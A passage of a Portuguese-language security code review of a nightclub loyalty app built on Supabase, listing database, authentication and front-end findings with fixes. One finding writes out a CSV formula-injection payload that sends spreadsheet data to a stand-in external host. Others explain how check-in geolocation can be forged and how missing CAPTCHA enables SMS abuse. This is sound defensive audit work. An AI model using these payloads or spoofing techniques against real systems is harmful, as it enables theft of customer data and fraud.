# Revisão de código — Clube do Bafafã (agosto/2026)

Revisão independente do código da aplicação antes do piloto controlado com
usuários reais. O foco foi defeito real e risco concreto, não estilo.

## Resumo

| Severidade | Quantidade | Corrigidos nesta revisão |
|---|---|---|
| Crítico | 1 | 0 |
| Alto | 7 | 2 (sendo 1 parcial) |
| Médio | 15 | 3 (sendo 1 parcial) |
| Baixo | 12 | 1 |
| **Total** | **35** | **6** |

Nenhum achado Crítico ou Alto de banco de dados foi corrigido por mim: todos
exigem uma migration nova, e a orientação era não alterar migrations já
aplicadas em produção.

Os cinco mais sérios, em uma linha cada:

1. **C1** — as duas funções que concedem mimo assumem esquemas opostos de
   `user_rewards`; uma das duas falha e derruba o check-in na portaria.
2. **A1** — gatilho de marcos duplicado em `checkins`, e a cópia órfã não trata
   exceção, anulando a blindagem que protegia o check-in.
3. **A2** — o check-in por geolocalização é declarado pelo próprio cliente,
   é falsificável de qualquer lugar e concede mimos resgatáveis no balcão.
4. **A6** — a carteirinha entra em laço infinito de chamadas à RPC ao primeiro
   erro, justamente na tela usada no balcão (corrigido).
5. **A4** — o bloqueio de AAL2 funciona, mas não há caminho de recuperação: sem
   TOTP cadastrado antes do corte, admin e equipe ficam sem operar.

## Como ler este documento

- **Confiança**: cada achado indica se foi **confirmado** por leitura direta do
  código ou se é **a confirmar** (depende do estado real do banco em produção
  ou de configuração no painel do Supabase).
- **Escopo**: `src/**` e `supabase/migrations/*.sql`. Testes automatizados e
  conformidade com a LGPD estão sendo tratados separadamente.
- Achados de privacidade aparecem aqui apenas quando são **defeito técnico**
  (por exemplo, dado vazando por falha de RLS).

## Premissa que define a gravidade de tudo

O aplicativo **não possui nenhuma função de servidor**. Não há uma única
`createServerFn`, e `supabaseAdmin` (service role) não é usado em lugar algum
de `src/`. Toda chamada sai do navegador direto para o Supabase via
`supabase.rpc(...)` ou `supabase.from(...)`.

Consequência prática: **RLS e as RPCs `SECURITY DEFINER` são a única defesa
real**. Qualquer verificação em React (`if (roles.includes("admin"))`,
`MfaGate`, campos desabilitados) é conforto visual e pode ser ignorada por
qualquer pessoa com o DevTools aberto ou um `curl`.

De modo geral a camada de banco está **bem construída** para um projeto feito
com IA: RLS habilitado em todas as tabelas, `search_path` fixo em todas as
funções `SECURITY DEFINER`, escritas sensíveis revogadas de `authenticated`,
moderação de conteúdo aplicada por gatilho no banco (e não só no cliente) e
verificação de AAL2 que realmente funciona. Os problemas abaixo são pontuais,
mas dois deles atingem exatamente o fluxo da portaria.

## Uma ressalva importante sobre o estado do banco

`supabase/migrations/` e `docs/*_SETUP.sql` **não são o mesmo conjunto**.
Vários scripts em `docs/` são executados à mão no SQL Editor, e nem toda
migration tem script correspondente. Portanto o repositório **não permite
determinar com certeza o esquema em produção**. Onde isso muda a análise, o
achado indica os dois cenários e traz uma consulta de diagnóstico.

---

## Crítico

### C1 — As duas funções que concedem mimos discordam sobre o esquema de `user_rewards`. Uma das duas vai falhar na portaria.

**Confiança: confirmado** (a divergência é certa; qual dos dois lados quebra
depende do banco em produção).

Existem duas funções que inserem em `public.user_rewards`, e elas assumem
esquemas **opostos**:

| Função | Arquivo:linha | Assume |
|---|---|---|
| `grant_event_campaign_rewards` | `supabase/migrations/20260722120000_navigation_feed_geolocation_v19.sql:418-420` | que **existe** `UNIQUE (user_id, campaign_id)` |
| `refresh_user_milestone_rewards` | `supabase/migrations/20260725123000_fix_v193_user_rewards_conflict.sql:105-106` | que **não existe** |

```sql
-- 20260722120000_navigation_feed_geolocation_v19.sql:418
INSERT INTO public.user_rewards(user_id, campaign_id, event_id, checkin_id, expires_at)
VALUES(_user_id, v_campaign.id, _event_id, _checkin_id, v_expiration)
ON CONFLICT (user_id, campaign_id) DO NOTHING;   -- exige o índice único
```

```sql
-- 20260725123000_fix_v193_user_rewards_conflict.sql:105
INSERT INTO public.user_rewards(user_id, campaign_id, event_id, expires_at)
VALUES (_user_id, v_campaign.id, NULL, v_expiration);   -- exige que NÃO haja índice único
```

O índice foi criado em `20260714122942_...:134` e **removido** em
`supabase/migrations/20260715190000_operations_block2.sql:75-77`, que o
substituiu por um índice **não único**:

```sql
DROP INDEX IF EXISTS public.uq_user_rewards_user_campaign;
CREATE INDEX IF NOT EXISTS idx_user_rewards_user_campaign
  ON public.user_rewards(user_id, campaign_id);
```

`docs/BAFAFA_V1931_NOTAS.md` documenta que esse `ON CONFLICT` já causou falha
uma vez e foi removido **de `refresh_user_milestone_rewards`** — mas ninguém
removeu o `ON CONFLICT` idêntico de `grant_event_campaign_rewards`. A consulta
de verificação `docs/VERIFICAR_EVENTOS_MARCOS_V193.sql:7-10` só olha
`refresh_user_milestone_rewards`, por isso o problema passou.

**Por que importa concretamente:**

- **Se o índice único NÃO existe** (migrations aplicadas na ordem): o Postgres
  levanta `42P10 — there is no unique or exclusion constraint matching the ON
  CONFLICT specification` dentro de `grant_event_campaign_rewards`. Essa função
  é chamada por `validate_checkin_qr`
  (`20260722120000_navigation_feed_geolocation_v19.sql:512`), que é **o
  check-in por QR validado pela equipe**. O `RAISE` aborta a transação inteira
  e o check-in é desfeito. Isso acontece sempre que o evento tiver uma campanha
  `campaign_kind = 'event'` ativa dentro da janela
  (`20260722120000_...:393-399`) — ou seja, justamente numa noite com promoção.
  A fila para na porta.
- **Se o índice único ainda existe** (só os scripts de `docs/` foram
  executados): quem quebra é `refresh_user_milestone_rewards`, com
  `unique_violation` na segunda concessão da mesma campanha. Isso atinge
  campanhas com `per_user_limit > 1` e também o caso de recompensa revogada e
  reconcedida (o contador em `20260725123000_...:85-89` só conta
  `status <> 'revoked'`, então ele zera e a reinserção colide). Essa função é
  chamada **em linha** pelo check-in por geolocalização
  (`20260728120000_simplificacao_experiencia_v202.sql:442`), então o check-in
  do cliente também é abortado.

Não existe cenário em que as duas funções estejam corretas ao mesmo tempo.

**Diagnóstico — rode isto no SQL Editor antes de qualquer coisa:**

```sql
SELECT indexname, indexdef
FROM pg_indexes
WHERE schemaname = 'public'
  AND tablename = 'user_rewards';
```

**Correção recomendada** (numa migration nova, sem alterar as já aplicadas):
padronizar as duas funções no mesmo modelo. O modelo já validado é o de
`refresh_user_milestone_rewards` — `pg_advisory_xact_lock` + contagem, sem
`ON CONFLICT`, porque o negócio realmente permite `per_user_limit > 1`. Ou
seja: recriar `grant_event_campaign_rewards` **sem** a cláusula
`ON CONFLICT (user_id, campaign_id) DO NOTHING`, e garantir que o índice
`uq_user_rewards_user_campaign` continue removido. Depois, estender
`docs/VERIFICAR_EVENTOS_MARCOS_V193.sql` para verificar **as duas** funções.

---

## Alto

### A1 — Gatilho de marcos duplicado em `checkins`, e a cópia órfã não trata exceção

**Confiança: confirmado.**

Dois gatilhos `AFTER INSERT` diferentes chamam `refresh_user_milestone_rewards`
na mesma tabela:

- `checkins_refresh_milestones_v19` →
  `supabase/migrations/20260722120000_navigation_feed_geolocation_v19.sql:660-663`
- `checkins_refresh_milestones_v193` →
  `supabase/migrations/20260725120000_event_status_milestone_v193.sql:260-265`

A migration v193 só faz `DROP TRIGGER IF EXISTS checkins_refresh_milestones_v193`
— ela nunca remove o gatilho `_v19`. Os dois continuam ativos.

O que agrava: a versão v193 foi escrita **de propósito** para blindar o
check-in contra falha de campanha
(`20260725120000_event_status_milestone_v193.sql:252-255`):

```sql
EXCEPTION WHEN OTHERS THEN
  -- Uma falha de campanha nunca deve invalidar o check-in do cliente.
  RAISE WARNING 'Não foi possível recalcular marcos do usuário %: %', NEW.user_id, SQLERRM;
  RETURN NEW;
```

Mas a função do gatilho órfão, `tg_refresh_milestones_after_checkin()`
(`20260722120000_...:650-657`), **não tem esse `EXCEPTION`** e propaga o erro.
Ou seja, a proteção que o autor construiu está anulada: qualquer erro em
`refresh_user_milestone_rewards` — inclusive o de C1 — derruba o check-in.

Efeito adicional: o laço completo de campanhas roda **duas vezes por check-in**
(mais uma passagem indireta por `checkins_customer_journey`,
`20260726120000_crm_funil_comercial_v20.sql:921-923`). Para campanhas com
`per_user_limit > 1`, um único check-in pode conceder dois mimos.

**Correção:** numa migration nova,
`DROP TRIGGER IF EXISTS checkins_refresh_milestones_v19 ON public.checkins;`
(e, se não houver outro uso, remover a função
`tg_refresh_milestones_after_checkin`).

### A2 — O check-in por geolocalização é declarado pelo próprio cliente e concede mimos

**Confiança: confirmado.**

`src/routes/_authenticated/checkin.tsx:101-106` envia latitude, longitude e
precisão obtidas do navegador:

```ts
const { data, error: rpcError } = await supabase.rpc("checkin_with_geolocation", {
  _event_id: session.id,
  _latitude: latitude,
  _longitude: longitude,
  _accuracy_m: accuracy,
});
```

Do lado do banco
(`supabase/migrations/20260728120000_simplificacao_experiencia_v202.sql:403-412`)
a distância é calculada **a partir dessas mesmas coordenadas**. Como a RPC está
liberada para `authenticated`, qualquer pessoa logada pode chamá-la de qualquer
lugar do mundo com as coordenadas do bar e `_accuracy_m` pequeno. Nenhuma
verificação de servidor é possível sobre um dado que o servidor recebe pronto.

Dois detalhes pioram:

- `_accuracy_m` é do atacante e **alarga o próprio geofence**:
  `v_effective_radius := geofence_radius_m + least(_accuracy_m * 0.5, 120)`
  (`...v202.sql:409`). Declarar 240 m de imprecisão soma 120 m de raio.
- As coordenadas do local são fáceis de obter: a tabela `events` é legível e
  `session.venue_address` já aparece na tela
  (`src/routes/_authenticated/checkin.tsx:246`).

O comentário em
`supabase/migrations/20260724120000_checkin_reliability_v192.sql:133-134`
afirma que benefícios financeiros continuam dependendo de validação da equipe,
mas isso **não é o que o código faz**: a linha seguinte (`:135`, e `:442` na
v202) chama `refresh_user_milestone_rewards`, que insere em `user_rewards`
sempre que a campanha não exigir validação de equipe
(`20260725123000_fix_v193_user_rewards_conflict.sql:47-57`). Um check-in
forjado de casa vira mimo resgatável no balcão, e a equipe não tem como
distinguir — o mimo é legítimo aos olhos do banco.

Além do prejuízo financeiro, o check-in forjado libera a Resenha e o pedido de
"salve" (mensagem privada) com pessoas que **estão fisicamente na casa**. Para
uma casa noturna isso é uma questão de segurança das pessoas, não só de fraude.

**Correção recomendada** (não é código de aplicação — é configuração e regra de
negócio):

1. Colocar `requires_staff_validation = true` nas campanhas de marco durante o
   piloto, para que só `method IN ('qr','manual','code','qr_confirmed')` conte.
2. Tratar `method = 'geolocation'` como presença "fraca": suficiente para a
   experiência social básica, insuficiente para mimo e para abrir conversa
   privada.
3. Registrar e revisar anomalias (mesma conta com check-ins em noites em que
   não houve consumo, precisão declarada sempre no limite).

Não há correção puramente técnica: geolocalização de navegador é sempre
falsificável. O caminho é reduzir o que ela desbloqueia.

### A3 — Avaliações de evento podem ser inseridas sem nunca ter feito check-in

**Confiança: confirmado.**

`supabase/migrations/20260726120000_crm_funil_comercial_v20.sql:720-724`:

```sql
GRANT SELECT, INSERT, UPDATE ON public.event_reviews TO authenticated;
CREATE POLICY "Users manage own event reviews" ON public.event_reviews
  FOR ALL TO authenticated USING (auth.uid() = user_id) WITH CHECK (auth.uid() = user_id);
```

A RPC `submit_event_review`
(`20260726120000_crm_funil_comercial_v20.sql:1636+`) exige que exista um
check-in do usuário naquele evento. Mas o `GRANT` acima permite `POST` direto
em `/rest/v1/event_reviews` com qualquer `event_id` e qualquer nota, sem passar
pela RPC. A política só verifica que o `user_id` é o próprio — nada mais.

Importa porque essas notas alimentam os painéis administrativos e a leitura de
NPS do piloto: os números do piloto podem ser manipulados por qualquer conta,
inclusive para eventos em que a pessoa nunca esteve. O `UPDATE` também está
liberado, então dá para reescrever a avaliação depois.

A faxina de privilégios de v20.7
(`supabase/migrations/20260803153000_sensitive_tables_least_privilege_v207.sql`)
cobriu `qr_tokens`, `sales` e `sale_items`, mas esqueceu `event_reviews`.

**Correção:** numa migration nova,
`REVOKE INSERT, UPDATE ON public.event_reviews FROM authenticated;`, mantendo
`GRANT SELECT` e deixando `submit_event_review` como único caminho de escrita —
exatamente o padrão já usado nas outras tabelas comerciais.

### A4 — O bloqueio de AAL2 funciona, mas não tem caminho de recuperação

**Confiança: confirmado no código; impacto depende do estado das contas (a confirmar).**

A verificação em si é sólida e **não encontrei forma de burlá-la** pelo
navegador. `current_session_is_aal2()`
(`supabase/migrations/20260802120000_privileged_aal2_enforcement_v206.sql:31-33`)
lê apenas claims assinadas do JWT; `CREATE` no schema `public` está revogado
(`20260718120000_security_base_v15.sql:13`), então não há ataque de
`search_path`. Isso é bom e vale registrar.

O problema é operacional e é sério para um piloto:

1. **Risco de travar o acesso administrativo.** Toda escrita em `user_roles`
   passa pelas políticas `Admins can insert/update/delete roles`
   (`20260713150823_...:118-126`), que chamam `has_role(auth.uid(),'admin')` —
   e essa função agora exige AAL2
   (`20260803144500_has_role_self_scope_v207.sql:31-38`). Se nenhum admin tiver
   um fator TOTP **verificado** no momento do corte, não existe nenhum caminho
   pela API para recuperar o acesso. Não há RPC de emergência restrita a
   `service_role` em nenhuma migration.
2. **A equipe de porta para junto.** `validate_checkin_qr`
   (`20260722120000_...:457-459`), `inspect_commercial_qr`
   (`20260726120000_...:1153`) e `record_customer_sale`
   (`20260803143000_...:141-146`) exigem `has_role(..., 'equipe')`. Toda conta
   `equipe` precisa ter TOTP cadastrado **antes** do piloto, senão não valida
   check-in nem registra venda.
3. **`require_privileged_aal2()` é código morto e enganoso.** Definida em
   `20260802120000_privileged_aal2_enforcement_v206.sql:68-84`, não é chamada
   em lugar nenhum do repositório. Pior: apesar do nome, ela verifica **só**
   AAL2 e **não verifica papel algum**. Qualquer cliente comum que ative 2FA
   passa por ela. Se alguém futuramente usá-la como guarda de autorização —
   que é o que o nome sugere —, vai abrir um buraco.

**Correção:**
- Antes do deploy: cadastrar e **verificar** TOTP em pelo menos dois admins e
  em todas as contas `equipe`. Registrar isso na checklist de piloto.
- Criar uma RPC de emergência `SECURITY DEFINER` restrita a `service_role`
  (sem `GRANT` para `authenticated`) que permita reconceder o papel `admin`,
  a ser usada com a chave de serviço a partir do painel do Supabase.
- Renomear `require_privileged_aal2()` para algo honesto
  (`require_aal2()`) **ou** acrescentar a verificação de papel que o nome
  promete. Enquanto não for usada, remover é a opção mais segura.

### A5 — Sem `VITE_TURNSTILE_SITE_KEY` o CAPTCHA some silenciosamente, e o envio de SMS fica aberto

**Confiança: código confirmado; se a chave está configurada em produção é a confirmar.**

`src/components/auth/turnstile.tsx:96-97`:

```ts
export function useAuthCaptcha() {
  const required = Boolean(getTurnstileSiteKey());
```

Se a variável estiver vazia — e ela está vazia no modelo,
`.env.example:12` (`VITE_TURNSTILE_SITE_KEY=""`) — então `required` é `false`,
`TurnstileChallenge` retorna `null` (`turnstile.tsx:87`) e nenhum
`captchaToken` é enviado. Não há aviso, log nem degradação visível: o desafio
simplesmente deixa de existir.

O que isso expõe é o cadastro por telefone,
`src/routes/auth.tsx:308-312`:

```ts
const { error } = await supabase.auth.signInWithOtp({
  phone: normalized,
  options: { shouldCreateUser: true, captchaToken: captcha.token ?? undefined, ... }
});
```

Sem CAPTCHA, um script pode disparar OTP por SMS em volume para números
arbitrários. No Brasil isso é **custo direto em reais** por mensagem, e é um
alvo conhecido de abuso ("SMS pumping"). Para um piloto com orçamento pequeno,
uma noite de abuso consome a verba de SMS inteira.

**Correção:**
1. Configurar Turnstile no Cloudflare, no Supabase Auth **e** na Vercel antes
   do piloto — os três, porque o Supabase só valida o token se o CAPTCHA
   estiver habilitado no projeto.
2. Independente disso, ativar os limites de taxa de SMS no painel do Supabase
   Auth (por IP e por número) e definir um teto de gasto no provedor de SMS.
3. Considerar falhar de forma visível quando a chave estiver ausente em
   produção, em vez de desativar o desafio em silêncio.

### A6 — A carteirinha entra em laço infinito de chamadas ao primeiro erro — **corrigido**

**Confiança: confirmado.**

Em `src/routes/_authenticated/carteira.tsx` (código original, linhas 39-56):

```ts
const generate = useCallback(async () => {
  if (generating) return;
  setGenerating(true);
  const { data, error } = await supabase.rpc("create_my_qr_token", { ... });
  setGenerating(false);
  if (error) return toast.error(publicErrorMessage(error, "..."));
  ...
  setToken(row as TokenResult);
}, [generating]);

useEffect(() => {
  if (!loading && !token) void generate();
}, [generate, loading, token]);
```

`generating` está na lista de dependências do `useCallback`, então **toda
mudança desse estado cria uma nova `generate`**, e `generate` está nas
dependências do efeito. No caminho de erro, `setGenerating(false)` executa e
`token` continua `null` — o efeito dispara de novo, chama a RPC de novo,
falha de novo, e assim indefinidamente.

No caminho de sucesso o laço para, porque `setToken` entra no mesmo lote de
renderização e a guarda `!token` passa a barrar. **É exatamente o caminho de
falha que não tem freio.**

Importa porque esta é a tela que o cliente abre **no balcão**, na hora de
pagar. Qualquer falha de rede, sessão expirada ou a mensagem
`'Não foi possível gerar o código'` (que a RPC devolve após 15 colisões de
código curto) transforma o celular do cliente numa fonte de chamadas sem
limite contra o Postgres, empilhando notificações de erro na tela. Com várias
pessoas na fila ao mesmo tempo, é um ataque de negação de serviço acidental
contra o próprio banco, no pior momento possível.

**Corrigido** — ver "Correções aplicadas".

### A7 — Exclusão definitiva de evento com guarda que falha aberto — **parcialmente corrigido**

**Confiança: confirmado.**

`src/components/admin/admin-panel.tsx:1036-1068`. A função `remove()` conta
`checkins` e `campaigns` do evento; se as duas contagens forem zero, executa
uma exclusão **definitiva**:

```ts
const { error } = await supabase.from("events").delete().eq("id", event.id);
```

Dois problemas:

1. **A guarda falhava aberto.** As consultas usam `{ count: "exact", head: true }`,
   e o PostgREST devolve `count: null` quando não emite o cabeçalho
   `Content-Range`. O teste original era `(checkins.count ?? 0) > 0` — ou seja,
   uma contagem **indeterminada** era tratada como "zero", e o código seguia
   direto para o ramo destrutivo. Uma falha de verificação virava permissão
   para apagar.
2. **A verificação é incompleta.** Pelas migrations, `events` tem
   `ON DELETE CASCADE` para `event_chat_messages`, `event_reviews`,
   `customer_event_sessions`, `collective_goals`, `private_chat_threads` e
   `salve_requests`. Um evento com histórico de Resenha, avaliações e uma meta
   de Fofocômetro — mas ainda sem nenhum check-in — é apagado em silêncio, com
   tudo junto. O texto de confirmação diz apenas "Remover o evento da agenda?",
   sem indicar que é irreversível.

O ponto 1 **foi corrigido** (a contagem nula agora é tratada como "tem
dependências", caindo no ramo seguro que apenas cancela o evento). O ponto 2
**não foi corrigido**, porque a solução correta é mover a operação para uma RPC
`SECURITY DEFINER` que verifique todas as tabelas dependentes no servidor —
isso é reestruturação, fora do escopo autorizado.

**Correção recomendada:** criar `admin_delete_event(uuid)` como RPC
`SECURITY DEFINER` com verificação de papel, que confira todas as tabelas
dependentes e recuse a exclusão quando houver histórico, e trocar o texto de
confirmação para deixar claro que a remoção é permanente.

---

## Médio

### M1 — `my_event_journey()` foi quebrada pelo endurecimento de `sync_event_statuses()`

**Confiança: confirmado.**

`supabase/migrations/20260727120000_feed_resiliente_fofocometro_v201.sql:47`,
primeira instrução útil da função:

```sql
PERFORM public.sync_event_statuses();
```

E `sync_event_statuses()` foi reescrita depois, em
`supabase/migrations/20260803143000_security_hardening_rpc_commercial_v207.sql:20-24`:

```sql
if v_auth_role is distinct from 'service_role' then
  if v_actor is null or not public.has_role(v_actor, 'admin') then
    raise exception 'Acesso restrito à administração.';
```

`my_event_journey` é `SECURITY DEFINER`, mas isso **não** troca as claims do
JWT: dentro dela, `auth.role()` continua sendo `'authenticated'` e
`has_role(uid,'admin')` continua `false` para um cliente comum. Resultado:
`my_event_journey()` levanta *"Acesso restrito à administração."* para todo
usuário que não seja admin.

**Por que não é Alto:** hoje ninguém chama essa RPC. `my_event_journey`
aparece apenas em `src/integrations/supabase/types.ts:2757` (arquivo gerado). E
os componentes que consumiriam esse dado —
`src/components/customer/customer-journey.tsx` e
`src/components/customer/fofocometro-card.tsx` — **não são importados por
nenhum arquivo**: são código morto. A tela não quebra porque a
funcionalidade está desligada.

É uma armadilha, não uma falha ativa: no momento em que a jornada do cliente
for religada durante o piloto, ela falha na primeira chamada.

**Correção:** separar a rotina interna da rotina exposta. Criar
`sync_event_statuses_internal()` sem `GRANT` para `authenticated` e contendo
apenas o `UPDATE`; fazer `sync_event_statuses()` (a pública, com a checagem de
admin) e `my_event_journey()` chamarem a interna. Alternativamente, remover o
`PERFORM` de `my_event_journey` e deixar a sincronização a cargo do gatilho
`events_auto_status_v193` e do painel administrativo.

### M2 — A tela da equipe deixa editar preço e custo, e o servidor trata isso como fraude

**Confiança: confirmado.**

`src/routes/_authenticated/staff/checkin.tsx:556-581` renderiza dois campos
livres, "Venda" e "Custo", e o valor digitado é enviado na RPC
(`staff/checkin.tsx:237-244`).

Só que o servidor foi endurecido depois. `record_customer_sale`
(`supabase/migrations/20260803143000_security_hardening_rpc_commercial_v207.sql:261-285`)
compara o valor recebido com o catálogo e, em qualquer divergência:

```sql
perform public.record_security_event(
  'high', 'operations', 'sale_catalog_tampering',
  'Tentativa de alterar preço ou custo de catálogo em uma venda', ...
);
raise exception 'O preço ou custo do produto mudou. Atualize a tela e tente novamente.';
```

Ou seja: se a pessoa do caixa ajustar o preço — que é exatamente o que os
campos convidam a fazer —, a venda inteira é recusada **e** um evento de
segurança de severidade `high` é gravado contra ela. Numa noite movimentada o
painel de segurança enche de alertas falsos, e o operador não entende por que a
venda não passa (a mensagem fala em "o preço mudou", que não foi o que
aconteceu).

O endurecimento do servidor está **certo**. Quem está desalinhado é a
interface.

**Correção:** deixar os campos de preço e custo somente leitura, exibindo o
valor de catálogo (que já vem em `products`), e remover `unit_price_cents` /
`unit_cost_cents` do envio em `staff/checkin.tsx:237-244` — a RPC já os descarta
(`...v207.sql:289-291`). Ajuste de preço, quando for necessário, deve ser um
fluxo administrativo próprio com auditoria. *Não apliquei esta correção porque
mexe na interface, fora do escopo autorizado.*

### M3 — O painel de segurança informa que o MFA **não** está exigido, quando está

**Confiança: confirmado.**

`supabase/migrations/20260721120000_infrastructure_continuity_v18.sql:340-342`
detecta a exigência de MFA procurando a string `aal2` no corpo de `has_role`:

```sql
'key','privileged_mfa','label','MFA exigido nos papéis privilegiados','ok',
position('aal2' in pg_get_functiondef('public.has_role(uuid,public.app_role)'::regprocedure)) > 0
```

Depois de `supabase/migrations/20260803144500_has_role_self_scope_v207.sql`, o
corpo de `has_role` não contém mais o literal `aal2` — ele delega para
`public.current_session_is_aal2()`. O indicador passa a mostrar vermelho para um
controle que está funcionando.

Um indicador de segurança que mente é pior que não ter indicador: ou o dono
persegue um problema inexistente, ou aprende a ignorar o painel.

No mesmo trecho, `v_sensitive_tables`
(`20260721120000_infrastructure_continuity_v18.sql:289-292`) ainda lista as
9 tabelas da v15 e não inclui nada criado da v18 em diante — `sales`,
`sale_items`, `qr_tokens`, `private_chat_messages`, `private_chat_reports`,
`salve_requests`, `customer_event_sessions`. O sinal verde de "RLS nas tabelas
sensíveis" cobre menos da metade do que deveria.

**Correção:** trocar a heurística de texto por uma verificação de
comportamento — por exemplo `SELECT public.current_session_is_aal2()` combinado
com `to_regprocedure('public.current_session_is_aal2()') IS NOT NULL` — e
atualizar a lista de tabelas sensíveis, de preferência derivando-a de
`pg_tables` em vez de manter uma lista fixa.

### M4 — A normalização de espaços no nome nunca funcionou

**Confiança: confirmado.**

`supabase/migrations/20260718120000_security_base_v15.sql:77`:

```sql
NEW.display_name := btrim(regexp_replace(coalesce(NEW.display_name, ''), '\\s+', ' ', 'g'));
```

O corpo da função está entre `$$ ... $$`. Em *dollar quoting* o PostgreSQL
**não** processa sequências de escape, então o padrão que chega ao motor de
expressão regular é literalmente `\\s+` — que em POSIX significa "uma barra
invertida seguida de um ou mais caracteres `s`", e não "espaços em branco".

Efeito: nomes com espaços internos repetidos passam sem normalização (o
`btrim` externo ainda limpa as pontas), e o `char_length` seguinte mede a
string não normalizada. É o único lugar do repositório com esse erro — as
demais expressões regulares em SQL estão corretas.

Baixo impacto de segurança, mas é sujeira visível nos nomes exibidos e um
vetor barato de personificação (`"João  Silva"` com dois espaços fica visualmente
igual a `"João Silva"`).

**Correção:** numa migration nova, recriar `tg_validate_profile_input()` com
`'\s+'` (uma barra só). Não alterei a migration existente porque ela já foi
aplicada em produção.

### M5 — `script-src 'unsafe-inline'` na CSP, com a sessão guardada no `localStorage`

**Confiança: confirmado.**

`src/lib/security-headers.ts:43` e o espelho em `vercel.json:75` liberam
`'unsafe-inline'` para scripts. Ao mesmo tempo,
`src/integrations/supabase/client.ts:60` guarda a sessão no `localStorage`:

```ts
storage: typeof window !== "undefined" ? localStorage : undefined,
```

A combinação significa que **qualquer XSS vira tomada de conta completa** — o
token é legível por JavaScript e a CSP não impede a execução de script inline
injetado.

Ressalva honesta: não encontrei nenhum sink de XSS explorável hoje. O único
`dangerouslySetInnerHTML` está em `src/components/ui/chart.tsx:73`, que é
boilerplate do shadcn **não importado por nenhum arquivo** do projeto. O
restante do cabeçalho de segurança está bem feito (`frame-ancestors 'none'`,
`object-src 'none'`, HSTS, `X-Robots-Tag` de piloto).

Portanto isto é redução de superfície, não uma falha ativa.

**Correção:** o `'unsafe-inline'` é exigido pelo hidratador do TanStack Start,
então removê-lo direto quebra o app. O caminho é adotar `nonce` por requisição
em `applySecurityHeaders` (`src/lib/security-headers.ts:62`), o que exige apoio
do framework. Enquanto isso não acontece, vale ao menos remover
`src/components/ui/chart.tsx` do repositório, já que ele não é usado e é o
único sink de HTML bruto.

### M6 — Troca de senha sem reautenticação

**Confiança: a confirmar** — depende de configuração no painel do Supabase, que
não é visível no repositório.

`src/routes/reset-password.tsx:67` chama `supabase.auth.updateUser({ password })`
e, em seguida, `signOut({ scope: "others" })` (`:68`). A trava local
`readValidPasswordRecovery` (`src/lib/auth-security.ts:106-124`) guarda um
marcador no `sessionStorage` — é defesa em profundidade útil contra uso
acidental, mas **não é uma barreira**: quem tiver a sessão pode chamar
`updateUser` direto pela API, sem passar por essa tela.

O resultado é que uma sessão obtida em aparelho compartilhado (o cenário comum
no público de uma casa noturna: celular emprestado, sessão esquecida) permite
trocar a senha **sem saber a senha atual** e depois expulsar o dono legítimo de
todos os outros aparelhos.

**Correção:** habilitar "Secure password change" (exigir reautenticação para
troca de senha) no painel Supabase Auth. Verificar também se `updateUser` está
configurado para exigir AAL2 em contas privilegiadas.

### M7 — `GRANT` amplo de escrita em `feed_posts` e `venues` apoiado só na política

**Confiança: confirmado; sem buraco ativo.**

- `supabase/migrations/20260722120000_navigation_feed_geolocation_v19.sql:123`
  — `GRANT INSERT, UPDATE, DELETE ON public.feed_posts TO authenticated;`
- `supabase/migrations/20260723120000_campaign_global_venues_v191.sql:34`
  — `GRANT SELECT, INSERT, UPDATE, DELETE ON public.venues TO authenticated;`

Hoje ambas estão cobertas por uma política `Admins manage ...` do tipo
`FOR ALL`, e as políticas de leitura que coexistem não se aplicam a escrita —
então **não há vazamento neste momento**. O problema é a margem: um único
`DROP POLICY` acidental (ou uma política nova mais permissiva) transforma isso
em escrita total para qualquer usuário logado. As demais tabelas comerciais já
foram fechadas por
`supabase/migrations/20260803153000_sensitive_tables_least_privilege_v207.sql`;
estas duas ficaram de fora.

**Correção:** aplicar o mesmo padrão da v20.7 — revogar escrita de
`authenticated` e expor as operações administrativas por RPC `SECURITY DEFINER`
com verificação de papel, como já é feito em `admin_upsert_product`.

### M8 — Conceder o papel `admin` não pede confirmação alguma

**Confiança: confirmado.**

`src/components/admin/admin-panel.tsx:3480-3490` (`toggleRole`), com os botões
em `:3519-3533`. Um clique único concede ou revoga papel — sem
`window.confirm`, sem reautenticação, sem motivo registrado.

O filtro do `delete` está correto
(`.eq("user_id", userId).eq("role", role)`), e existe a proteção
`disabled={isSelf && userRoles.includes("admin")}` — mas ela só impede o admin
de rebaixar a si mesmo. **Não há nada protegendo a concessão.**

Como RLS é a única defesa deste aplicativo (ver a premissa no início), um
clique errado numa lista longa de clientes dá a um cliente comum acesso de
escrita a todas as tabelas administrativas. E as escritas em `user_roles`
já disparam eventos de segurança de severidade `critical`
(`supabase/migrations/20260803154500_user_roles_update_hardening_v207.sql:102-136`),
o que significa que o erro fica registrado como incidente — mas depois de
acontecer.

**Correção:** exigir `window.confirm` nomeando a pessoa e o papel (obrigatório
para `admin`) e encaminhar a concessão por uma RPC `SECURITY DEFINER` que grave
o motivo na auditoria. Não apliquei porque envolve texto de interface.

### M9 — O BAFAFEED apaga a tela inteira a cada 30 segundos e as cargas competem entre si

**Confiança: confirmado.**

`src/routes/_authenticated/inicio.tsx:115-176`. `load()` chama
`setLoading(true)` incondicionalmente na linha 117, e as linhas 173-176
registram `setInterval(() => void load(), 30_000)`.

O efeito prático é que, a cada 30 segundos, o feed inteiro é substituído por
`<LoadingCard label="Puxando as novidades…" />` e a posição de rolagem se
perde — no meio da leitura. Numa noite de piloto, com o cliente lendo as
Fofoquinhas, a tela pisca e volta ao topo duas vezes por minuto.

Além disso não há guarda de ordem: um "tentar novamente" manual e um tique do
intervalo podem estar em andamento ao mesmo tempo, e a resposta **mais lenta**
(logo, mais antiga) é a que vence o `setData` da linha 154.

**Correção:** passar um parâmetro `silent` para que `setLoading(true)` só
ocorra na primeira carga e nas manuais, e proteger a escrita com um
identificador monotônico de requisição (`const id = ++reqRef.current; … if (id
!== reqRef.current) return;`). É mudança de comportamento visível, então
deixei para o dono decidir.

### M10 — A exportação de CSV é vulnerável a injeção de fórmula

**Confiança: confirmado.**

`src/components/admin/management-dashboard.tsx:1220-1244`. A função `escape()`
trata aspas corretamente conforme a RFC 4180, mas **não neutraliza** células que
começam com `=`, `+`, `-` ou `@`.

Os campos `display_name` e `how_found_us` são preenchidos livremente pelo
usuário. Alguém que se cadastre com o nome
`=HYPERLINK("http://malicioso/?x="&A1,"clique")` planta uma fórmula que
**executa quando o administrador abre o CSV no Excel** — e a planilha em
questão contém e-mail, telefone e data de nascimento de todos os clientes. A
mesma célula pode exfiltrar o conteúdo da planilha para um servidor externo.

Vale notar que a moderação de conteúdo
